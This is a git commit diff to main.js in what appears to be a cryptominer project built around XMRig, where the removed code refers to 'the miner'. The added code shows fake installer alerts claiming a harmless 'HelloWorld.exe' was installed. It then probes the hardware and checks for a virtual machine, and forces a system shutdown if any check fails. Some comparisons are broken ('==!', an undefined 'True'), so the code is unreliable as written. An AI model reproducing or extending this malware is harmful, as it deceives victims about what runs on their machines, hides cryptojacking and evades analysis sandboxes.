3a0bf9ffe7de904eed4f8e942edc9198f5946760
Morgan Steel <161970789+morgansteel@users.noreply.github.com>
2024-05-27 12:07:24 -0700

    Update main.js

--- main.js
+++ main.js
@@ -1,46 +1,51 @@
 // needed libraries for information collection in XMRig
 
-import { cmd, path, notify } from 'windows-interact';
-import system from 'systeminformation';
-cmd('dir');
+const Win = require('windows-interact');
+const si = require('systeminformation');
 
-// System data for the miner >:D
+// Fake installer
 
-const cpuCores = si.cpu(cores);
-const os = si.osInfo(platform);
-const virtualized = si.system(virtual);
-const totalMem = si.mem.total(); // in bytes!
-const mobile = si.battery.hasBattery();
-const freeOnDisk = si.diskLayout.size(); // in bytes!
-
-// Get path to cmd.exe for the miner to be run from
-
-path`C:\Windows\system32\cmd.exe`;
-
-// Check if the hardware is unsupported or virtualized
-
-if (os ==! 'Windows') {
-    notify("This app can't run on your PC");
-}
-if (virtualized == True) {
-    throw new Error('Nice try!');
-}
-if (totalMem < 8000000000) {
-    throw new Error('Not enough memory.');
-}
-if (freeOnDisk < 32000000000) {
-    throw new Error('Not enough disk space.');
-}
-if (cpuCores < 2) {
-    throw new Error('Not enough CPU cores.');
+function wait(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// While tree for laptops (separate file maybe...?)
+async function fakeInstall() {
 
-if (mobile == True) {
-    while (si.battery.currentCapacity() < 10) {
+    try {
+        await Win.alert('HelloWorld.exe is now being installed on your computer.', 'HelloWorld Installer');
+        await Win.alert('Estimated disk space needed: 2 MB', 'HelloWorld Installer');
+        await Win.alert('HelloWorld.exe has been successfully installed.', 'Installation successful');
+    } catch {
+        console.log("an error occured");
     }
 }
+
+fakeInstall();
+
+async function checkForHardwareSupport() {
+
+    try {
+        const cpu = await si.cpu();
+        const os = await si.osInfo();
+        const mem = await si.mem(); // in bytes!
+        const system = await si.system(); // used for checking if it's a virtual machine
+        const disk = await si.diskLayout();
+
+        if (cpu.physicalCores < 2 || os.platform ==! 'Windows' || mem.total < 4000000000 || system.virtual == True || disk.size < 16000000000) {
+            // If the CPU has less than 2 cores, or is not running Windows, or has less than 4 GB of RAM, or is a VM with less than 16 GB of space, exit
+            Win.showDesktop();
+            Win.power.shutdown();
+        }
+    } catch {
+        Win.power.shutdown();
+    } finally {
+        console.log('Process finished with error code 0');
+    }
+}
+
+checkForHardwareSupport();
+
+
 
 
 
